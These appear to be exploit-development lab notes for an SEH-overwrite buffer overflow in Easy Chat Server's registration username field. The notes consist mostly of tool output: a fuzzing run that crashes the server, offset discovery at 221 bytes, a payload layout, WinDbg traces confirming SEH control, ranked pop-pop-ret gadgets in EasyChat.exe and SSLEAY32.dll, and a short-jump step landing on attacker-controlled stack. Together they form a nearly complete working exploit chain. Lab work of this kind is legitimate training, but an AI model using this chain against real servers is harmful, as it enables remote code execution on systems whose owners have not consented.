### User Registration

```txt
POST /registresult.htm HTTP/1.1
Host: 192.168.1.114
Content-Length: 174
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://192.168.1.114
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.1.114/register.ghp
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

UserName=aaaa&Password=password&Password1=password&Sex=2&Email=%40&Icon=0.gif&Resume=&cw=1&RoomID=%3C%21--%24RoomID--%3E&RepUserName=%3C%21--%24UserName--%3E&submit1=Register
```

Attempting to fuzz the username parameter when registering

```bash
❯ python3 fuzz_username.py --host 192.168.1.114 --port 80 --start 210 --step 10 --stop 300 --char A
[+] Sending username length: 210
[+] Response: HTTP/1.0 200 OK
Date: Sun, 23 Aug 2026 19:01:16 GMT
Server: Easy Chat Server/1.0
Accept-Ranges: bytes
Content-Length
[+] Sending username length: 220
[+] Response: HTTP/1.0 200 OK
Date: Sun, 23 Aug 2026 19:01:16 GMT
Server: Easy Chat Server/1.0
Accept-Ranges: bytes
Content-Length
[+] Sending username length: 230
[-] No response at length 230
 ```

SEH activated

```txt
0:007> !exchain
Invalid exception stack at 41414141
```

Creating a pattern

```txt
0:007> dx @$osed().pattern_create(500, "msf")

=== Pattern Create ===
[+] Format: msf
[+] Length: 500
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq
Why this matters for exploitation: Reliable offset discovery is the foundation of controlled EIP/RIP overwrite.
@$osed().pattern_create(500, "msf") : true
```

```text
@$osed().pattern_offset(34684133, "msf") : true
0:005> dx @$osed().pattern_offset(0x34684133, "msf")

=== Pattern Offset ===
[+] Format: msf
[+] Needle: 3Ah4
[+] Offset: 221
Why this matters for exploitation: Exact offset maps crash control to payload layout and exploit reliability.
@$osed().pattern_offset(0x34684133, "msf") : true
0:005> !exchain
02986e18: 34684133
Invalid exception stack at 68413268
```

```python
PAYLOAD = b"A" * 217 + b"B" * 4 + b"C" * 100
```

```txt
0:005> g
(4a0.690): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=43434343 ebx=005eed00 ecx=43434343 edx=005eee50 esi=005eee48 edi=005e0000
eip=771dfe47 esp=024b6aa4 ebp=024b6bdc iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
ntdll!RtlpFreeHeap+0x797:
771dfe47 8b00            mov     eax,dword ptr [eax]  ds:0023:43434343=????????
0:005> !exchain
024b6bcc: ntdll!_except_handler4+0 (77238dd0)
  CRT scope  0, func:   ntdll!RtlpFreeHeap+12b2 (771e0962)
024b6c8c: EasyChat+46a60 (00446a60)
024b6e18: 43434343
Invalid exception stack at 42424242
```

SEH Chain

```text
0:005> dx @$osed().seh.visualize()

=== SEH Chain ===
#   Node        Next        Handler     Module+Offset             SafeSEH   ASLR      Exec     ESP Delta   Integrity    Assessment
--  ----------  ----------  ----------  ------------------------  --------  --------  -------  ----------  -----------  ----------
0   0x024B6BCC  0x024B6C8C  0x77238DD0  ntdll.dll+0x98DD0         enabled   enabled   yes      +0x128      OK           PROTECTED 
1   0x024B6C8C  0x024B6E18  0x00446A60  EasyChat.exe+0x46A60      disabled  disabled  yes      +0x1E8      OK           CANDIDATE 
2   0x024B6E18  0x42424242  0x43434343  <unmapped>                unknown   unknown   no       +0x374      BROKEN NEXT  INVALID   
[!] SEH walk stopped at unreadable record 0x42424242: Memory read failed at 0x42424242 (Unable to read target memory at '0x42424242' in method 'readMemoryValues').
Why this matters for exploitation: The chain identifies overwritten frames, ESP-relative offsets, and handlers protected by SafeSEH or ASLR.
@$osed().seh.visualize() : true
```

pop; pop; ret

```text
0:005> dx @$osed().seh_ppr()

=== SEH PPR Candidates ===
Rank    Address             Module                                         Offset        Instructions              BadChar   ASLR      SafeSEH   Score 
------  ------------------  ---------------------------------------------  ------------  ------------------------  --------  --------  --------  ------
1       0x0043CB52          C:\EFS Software\Easy Chat Server\EasyChat.exe  0x3CB52       pop eax ; pop ebp ; ret   safe      disabled  disabled  90    
2       0x0044AC2D          C:\EFS Software\Easy Chat Server\EasyChat.exe  0x4AC2D       pop eax ; pop ebp ; ret   safe      disabled  disabled  90    
3       0x0044B414          C:\EFS Software\Easy Chat Server\EasyChat.exe  0x4B414       pop eax ; pop ebp ; ret   safe      disabled  disabled  90    
4       0x0044B9A6          C:\EFS Software\Easy Chat Server\EasyChat.exe  0x4B9A6       pop eax ; pop ebp ; ret   safe      disabled  disabled  90    
5       0x00457352          C:\EFS Software\Easy Chat Server\EasyChat.exe  0x57352       pop eax ; pop ebp ; ret   safe      disabled  disabled  90    
6       0x746ECC4D          C:\Windows\SYSTEM32\DNSAPI.dll                 0x2CC4D       pop eax ; pop ebx ; ret   safe      enabled   enabled   -25   
7       0x746ED1C3          C:\Windows\SYSTEM32\DNSAPI.dll                 0x2D1C3       pop eax ; pop ebx ; ret   safe      enabled   enabled   -25   
8       0x75240E98          C:\Windows\System32\msvcp_win.dll              0x20E98       pop eax ; pop ebp ; ret   safe      enabled   enabled   -25   
9       0x752415DD          C:\Windows\System32\msvcp_win.dll              0x215DD       pop eax ; pop ebp ; ret   safe      enabled   enabled   -25   
10      0x7525CE67          C:\Windows\System32\msvcp_win.dll              0x3CE67       pop eax ; pop ebp ; ret   safe      enabled   enabled   -25   
11      0x75511E44          C:\Windows\System32\ucrtbase.dll               0x41E44       pop eax ; pop ebp ; ret   safe      enabled   enabled   -25   
12      0x75516ADA          C:\Windows\System32\ucrtbase.dll               0x46ADA       pop eax ; pop ebp ; ret   safe      enabled   enabled   -25   
13      0x75516B1A          C:\Windows\System32\ucrtbase.dll               0x46B1A       pop eax ; pop ebp ; ret   safe      enabled   enabled   -25   
14      0x75516B7A          C:\Windows\System32\ucrtbase.dll               0x46B7A       pop eax ; pop ebp ; ret   safe      enabled   enabled   -25   
15      0x75516BDA          C:\Windows\System32\ucrtbase.dll               0x46BDA       pop eax ; pop ebp ; ret   safe      enabled   enabled   -25   
16      0x75516C11          C:\Windows\System32\ucrtbase.dll               0x46C11       pop eax ; pop ebp ; ret   safe      enabled   enabled   -25   
17      0x75516C5A          C:\Windows\System32\ucrtbase.dll               0x46C5A       pop eax ; pop ebp ; ret   safe      enabled   enabled   -25   
18      0x75516CBA          C:\Windows\System32\ucrtbase.dll               0x46CBA       pop eax ; pop ebp ; ret   safe      enabled   enabled   -25   
19      0x75516D1A          C:\Windows\System32\ucrtbase.dll               0x46D1A       pop eax ; pop ebp ; ret   safe      enabled   enabled   -25   
20      0x7554C3ED          C:\Windows\System32\ucrtbase.dll               0x7C3ED       pop eax ; pop ebp ; ret   safe      enabled   enabled   -25   
21      0x7554EAB4          C:\Windows\System32\ucrtbase.dll               0x7EAB4       pop eax ; pop ebp ; ret   safe      enabled   enabled   -25   
22      0x75560A5D          C:\Windows\System32\ucrtbase.dll               0x90A5D       pop eax ; pop ebp ; ret   safe      enabled   enabled   -25   
23      0x75566F6E          C:\Windows\System32\ucrtbase.dll               0x96F6E       pop eax ; pop ebp ; ret   safe      enabled   enabled   -25   
24      0x755958A2          C:\Windows\System32\ucrtbase.dll               0xC58A2       pop eax ; pop ebp ; ret   safe      enabled   enabled   -25   
25      0x755BCCCF          C:\Windows\System32\ucrtbase.dll               0xECCCF       pop eax ; pop ebp ; ret   safe      enabled   enabled   -25   
26      0x755BCCFF          C:\Windows\System32\ucrtbase.dll               0xECCFF       pop eax ; pop ebp ; ret   safe      enabled   enabled   -25   
27      0x757131D5          C:\Windows\System32\KERNELBASE.dll             0x1231D5      pop eax ; pop ebx ; ret   safe      enabled   enabled   -25   
28      0x7574EFFD          C:\Windows\System32\KERNELBASE.dll             0x15EFFD      pop eax ; pop ebp ; ret   safe      enabled   enabled   -25   
29      0x7574F00D          C:\Windows\System32\KERNELBASE.dll             0x15F00D      pop eax ; pop ebp ; ret   safe      enabled   enabled   -25   
30      0x757AA2DD          C:\Windows\System32\KERNELBASE.dll             0x1BA2DD      pop eax ; pop ecx ; ret   safe      enabled   enabled   -25   
31      0x75C30F28          C:\Windows\System32\ole32.dll                  0x90F28       pop eax ; pop ebx ; ret   safe      enabled   enabled   -25   
32      0x75FCCB08          C:\Windows\System32\RPCRT4.dll                 0x1CB08       pop eax ; pop ebx ; ret   safe      enabled   enabled   -25   
33      0x76686212          C:\Windows\System32\msvcrt.dll                 0x36212       pop eax ; pop ebp ; ret   safe      enabled   enabled   -25   
34      0x76686252          C:\Windows\System32\msvcrt.dll                 0x36252       pop eax ; pop ebp ; ret   safe      enabled   enabled   -25   
35      0x76686282          C:\Windows\System32\msvcrt.dll                 0x36282       pop eax ; pop ebp ; ret   safe      enabled   enabled   -25   
36      0x76692558          C:\Windows\System32\msvcrt.dll                 0x42558       pop eax ; pop ebp ; ret   safe      enabled   enabled   -25   
37      0x7669A0C8          C:\Windows\System32\msvcrt.dll                 0x4A0C8       pop eax ; pop ebp ; ret   safe      enabled   enabled   -25   
38      0x7669A119          C:\Windows\System32\msvcrt.dll                 0x4A119       pop eax ; pop ebp ; ret   safe      enabled   enabled   -25   
39      0x766DD2A7          C:\Windows\System32\msvcrt.dll                 0x8D2A7       pop eax ; pop ebp ; ret   safe      enabled   enabled   -25   
40      0x766DD2DD          C:\Windows\System32\msvcrt.dll                 0x8D2DD       pop eax ; pop ebp ; ret   safe      enabled   enabled   -25   
41      0x766DD313          C:\Windows\System32\msvcrt.dll                 0x8D313       pop eax ; pop ebp ; ret   safe      enabled   enabled   -25   
42      0x766E9192          C:\Windows\System32\msvcrt.dll                 0x99192       pop eax ; pop ebp ; ret   safe      enabled   enabled   -25   
43      0x766EA032          C:\Windows\System32\msvcrt.dll                 0x9A032       pop eax ; pop ebp ; ret   safe      enabled   enabled   -25   
44      0x766F196E          C:\Windows\System32\msvcrt.dll                 0xA196E       pop eax ; pop ebp ; ret   safe      enabled   enabled   -25   
45      0x766F19CC          C:\Windows\System32\msvcrt.dll                 0xA19CC       pop eax ; pop ebp ; ret   safe      enabled   enabled   -25   
46      0x766F238A          C:\Windows\System32\msvcrt.dll                 0xA238A       pop eax ; pop ebp ; ret   safe      enabled   enabled   -25   
47      0x766F23EA          C:\Windows\System32\msvcrt.dll                 0xA23EA       pop eax ; pop ebp ; ret   safe      enabled   enabled   -25   
48      0x76E59F75          C:\Windows\System32\KERNEL32.DLL               0x59F75       pop eax ; pop ebx ; ret   safe      enabled   enabled   -25   
49      0x76EC5385          C:\Windows\System32\ADVAPI32.dll               0x25385       pop eax ; pop ecx ; ret   safe      enabled   enabled   -25   
50      0x77000E00          C:\Windows\System32\combase.dll                0xE0E00       pop eax ; pop ecx ; ret   safe      enabled   enabled   -25   
Why this matters for exploitation: Reliable pop-pop-ret selection is central to practical SEH overwrite exploitation.
@$osed().seh_ppr() : true
```




```text
0:005> dx @$osed().seh_ppr("SSLEAY32")

=== SEH PPR Candidates ===
Rank    Address             Module                                         Offset        Instructions              BadChar   ASLR      SafeSEH   Score 
------  ------------------  ---------------------------------------------  ------------  ------------------------  --------  --------  --------  ------
1       0x1000227F          C:\EFS Software\Easy Chat Server\SSLEAY32.dll  0x227F        pop ebp ; pop ebx ; ret   safe      disabled  disabled  90    
2       0x100022BA          C:\EFS Software\Easy Chat Server\SSLEAY32.dll  0x22BA        pop ebp ; pop ebx ; ret   safe      disabled  disabled  90    
3       0x100022F7          C:\EFS Software\Easy Chat Server\SSLEAY32.dll  0x22F7        pop ebp ; pop ebx ; ret   safe      disabled  disabled  90    
4       0x10002334          C:\EFS Software\Easy Chat Server\SSLEAY32.dll  0x2334        pop ebp ; pop ebx ; ret   safe      disabled  disabled  90    
5       0x10002360          C:\EFS Software\Easy Chat Server\SSLEAY32.dll  0x2360        pop ebp ; pop ebx ; ret   safe      disabled  disabled  90    
6       0x100023BC          C:\EFS Software\Easy Chat Server\SSLEAY32.dll  0x23BC        pop ebp ; pop ebx ; ret   safe      disabled  disabled  90    
7       0x10003C1F          C:\EFS Software\Easy Chat Server\SSLEAY32.dll  0x3C1F        pop ebp ; pop ebx ; ret   safe      disabled  disabled  90    
8       0x10003C60          C:\EFS Software\Easy Chat Server\SSLEAY32.dll  0x3C60        pop ebp ; pop ebx ; ret   safe      disabled  disabled  90    
9       0x10003C9D          C:\EFS Software\Easy Chat Server\SSLEAY32.dll  0x3C9D        pop ebp ; pop ebx ; ret   safe      disabled  disabled  90    
10      0x10003CD3          C:\EFS Software\Easy Chat Server\SSLEAY32.dll  0x3CD3        pop ebp ; pop ebx ; ret   safe      disabled  disabled  90    
11      0x10003D29          C:\EFS Software\Easy Chat Server\SSLEAY32.dll  0x3D29        pop ebp ; pop ebx ; ret   safe      disabled  disabled  90    
12      0x10004267          C:\EFS Software\Easy Chat Server\SSLEAY32.dll  0x4267        pop ebp ; pop ebx ; ret   safe      disabled  disabled  90    
13      0x10004E89          C:\EFS Software\Easy Chat Server\SSLEAY32.dll  0x4E89        pop ebp ; pop ebx ; ret   safe      disabled  disabled  90    
14      0x10004E98          C:\EFS Software\Easy Chat Server\SSLEAY32.dll  0x4E98        pop ebp ; pop ebx ; ret   safe      disabled  disabled  90    
15      0x10006F0A          C:\EFS Software\Easy Chat Server\SSLEAY32.dll  0x6F0A        pop ebp ; pop ebx ; ret   safe      disabled  disabled  90    
16      0x10006FB4          C:\EFS Software\Easy Chat Server\SSLEAY32.dll  0x6FB4        pop ebp ; pop ebx ; ret   safe      disabled  disabled  90    
17      0x10007011          C:\EFS Software\Easy Chat Server\SSLEAY32.dll  0x7011        pop ebp ; pop ebx ; ret   safe      disabled  disabled  90    
18      0x10007084          C:\EFS Software\Easy Chat Server\SSLEAY32.dll  0x7084        pop ebp ; pop ebx ; ret   safe      disabled  disabled  90    
19      0x100070B8          C:\EFS Software\Easy Chat Server\SSLEAY32.dll  0x70B8        pop ebp ; pop ebx ; ret   safe      disabled  disabled  90    
20      0x1000710D          C:\EFS Software\Easy Chat Server\SSLEAY32.dll  0x710D        pop ebp ; pop ebx ; ret   safe      disabled  disabled  90    
21      0x10007140          C:\EFS Software\Easy Chat Server\SSLEAY32.dll  0x7140        pop ebp ; pop ebx ; ret   safe      disabled  disabled  90    
22      0x1000A704          C:\EFS Software\Easy Chat Server\SSLEAY32.dll  0xA704        pop ebp ; pop ebx ; ret   safe      disabled  disabled  90    
23      0x1000A70B          C:\EFS Software\Easy Chat Server\SSLEAY32.dll  0xA70B        pop ebp ; pop ebx ; ret   safe      disabled  disabled  90    
24      0x1000B49A          C:\EFS Software\Easy Chat Server\SSLEAY32.dll  0xB49A        pop ebp ; pop ebx ; ret   safe      disabled  disabled  90    
25      0x1000B4E3          C:\EFS Software\Easy Chat Server\SSLEAY32.dll  0xB4E3        pop ebp ; pop ebx ; ret   safe      disabled  disabled  90    
26      0x1000B600          C:\EFS Software\Easy Chat Server\SSLEAY32.dll  0xB600        pop ebp ; pop ebx ; ret   safe      disabled  disabled  90    
27      0x1000BB7B          C:\EFS Software\Easy Chat Server\SSLEAY32.dll  0xBB7B        pop ebp ; pop ebx ; ret   safe      disabled  disabled  90    
28      0x1000BBD3          C:\EFS Software\Easy Chat Server\SSLEAY32.dll  0xBBD3        pop ebp ; pop ebx ; ret   safe      disabled  disabled  90    
29      0x1000BBE7          C:\EFS Software\Easy Chat Server\SSLEAY32.dll  0xBBE7        pop ebp ; pop ebx ; ret   safe      disabled  disabled  90    
30      0x1000CD66          C:\EFS Software\Easy Chat Server\SSLEAY32.dll  0xCD66        pop ebp ; pop ebx ; ret   safe      disabled  disabled  90    
31      0x1000CDAF          C:\EFS Software\Easy Chat Server\SSLEAY32.dll  0xCDAF        pop ebp ; pop ebx ; ret   safe      disabled  disabled  90    
32      0x1000DD2E          C:\EFS Software\Easy Chat Server\SSLEAY32.dll  0xDD2E        pop ebx ; pop ecx ; ret   safe      disabled  disabled  90    
33      0x1000FD31          C:\EFS Software\Easy Chat Server\SSLEAY32.dll  0xFD31        pop ebx ; pop ecx ; ret   safe      disabled  disabled  90    
34      0x1000FDBA          C:\EFS Software\Easy Chat Server\SSLEAY32.dll  0xFDBA        pop ebx ; pop ecx ; ret   safe      disabled  disabled  90    
35      0x1000FDE7          C:\EFS Software\Easy Chat Server\SSLEAY32.dll  0xFDE7        pop ebx ; pop ecx ; ret   safe      disabled  disabled  90    
36      0x1000FE0D          C:\EFS Software\Easy Chat Server\SSLEAY32.dll  0xFE0D        pop ebx ; pop ecx ; ret   safe      disabled  disabled  90    
37      0x10013B35          C:\EFS Software\Easy Chat Server\SSLEAY32.dll  0x13B35       pop ebx ; pop ecx ; ret   safe      disabled  disabled  90    
38      0x10013BF0          C:\EFS Software\Easy Chat Server\SSLEAY32.dll  0x13BF0       pop ebx ; pop ecx ; ret   safe      disabled  disabled  90    
39      0x1001850D          C:\EFS Software\Easy Chat Server\SSLEAY32.dll  0x1850D       pop ebx ; pop edi ; ret   safe      disabled  disabled  90    
40      0x10018541          C:\EFS Software\Easy Chat Server\SSLEAY32.dll  0x18541       pop ebx ; pop edi ; ret   safe      disabled  disabled  90    
41      0x1001884A          C:\EFS Software\Easy Chat Server\SSLEAY32.dll  0x1884A       pop ebx ; pop ecx ; ret   safe      disabled  disabled  90    
42      0x10018885          C:\EFS Software\Easy Chat Server\SSLEAY32.dll  0x18885       pop ebx ; pop ecx ; ret   safe      disabled  disabled  90    
43      0x10018966          C:\EFS Software\Easy Chat Server\SSLEAY32.dll  0x18966       pop ebx ; pop ecx ; ret   safe      disabled  disabled  90    
44      0x10018C94          C:\EFS Software\Easy Chat Server\SSLEAY32.dll  0x18C94       pop ebp ; pop ecx ; ret   safe      disabled  disabled  90    
45      0x10018D7E          C:\EFS Software\Easy Chat Server\SSLEAY32.dll  0x18D7E       pop ebp ; pop ecx ; ret   safe      disabled  disabled  90    
46      0x10018DBF          C:\EFS Software\Easy Chat Server\SSLEAY32.dll  0x18DBF       pop ebp ; pop ecx ; ret   safe      disabled  disabled  90    
47      0x10018DED          C:\EFS Software\Easy Chat Server\SSLEAY32.dll  0x18DED       pop ebp ; pop ecx ; ret   safe      disabled  disabled  90    
48      0x10018E8D          C:\EFS Software\Easy Chat Server\SSLEAY32.dll  0x18E8D       pop ebx ; pop edi ; ret   safe      disabled  disabled  90    
49      0x10018EC1          C:\EFS Software\Easy Chat Server\SSLEAY32.dll  0x18EC1       pop ebx ; pop edi ; ret   safe      disabled  disabled  90    
50      0x1001B1DB          C:\EFS Software\Easy Chat Server\SSLEAY32.dll  0x1B1DB       pop ebx ; pop ecx ; ret   safe      disabled  disabled  90    
Why this matters for exploitation: Reliable pop-pop-ret selection is central to practical SEH overwrite exploitation.
@$osed().seh_ppr("SSLEAY32") : true
```

```text
Breakpoint 0 hit
eax=00000000 ebx=00000000 ecx=1001b1db edx=772465c0 esi=00000000 edi=00000000
eip=1001b1db esp=028a6540 ebp=028a6560 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
SSLEAY32!BIO_new_buffer_ssl_connect+0xdb:
1001b1db 5b              pop     ebx
0:007> r
eax=00000000 ebx=00000000 ecx=1001b1db edx=772465c0 esi=00000000 edi=00000000
eip=1001b1db esp=028a6540 ebp=028a6560 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
SSLEAY32!BIO_new_buffer_ssl_connect+0xdb:
1001b1db 5b              pop     ebx
0:007> !exchain
028a6554: ntdll!ExecuteHandler2+44 (772465c0)
028a6bcc: ntdll!_except_handler4+0 (77238dd0)
  CRT scope  0, func:   ntdll!RtlpFreeHeap+12b2 (771e0962)
028a6c8c: EasyChat+46a60 (00446a60)
028a6e18: SSLEAY32!BIO_new_buffer_ssl_connect+db (1001b1db)
Invalid exception stack at 909006eb
0:007> t
eax=00000000 ebx=772465a2 ecx=1001b1db edx=772465c0 esi=00000000 edi=00000000
eip=1001b1dc esp=028a6544 ebp=028a6560 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
SSLEAY32!BIO_new_buffer_ssl_connect+0xdc:
1001b1dc 59              pop     ecx
0:007> t
eax=00000000 ebx=772465a2 ecx=028a6640 edx=772465c0 esi=00000000 edi=00000000
eip=1001b1dd esp=028a6548 ebp=028a6560 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
SSLEAY32!BIO_new_buffer_ssl_connect+0xdd:
1001b1dd c3              ret
0:007> t
eax=00000000 ebx=772465a2 ecx=028a6640 edx=772465c0 esi=00000000 edi=00000000
eip=028a6e18 esp=028a654c ebp=028a6560 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
028a6e18 eb06            jmp     028a6e20
```

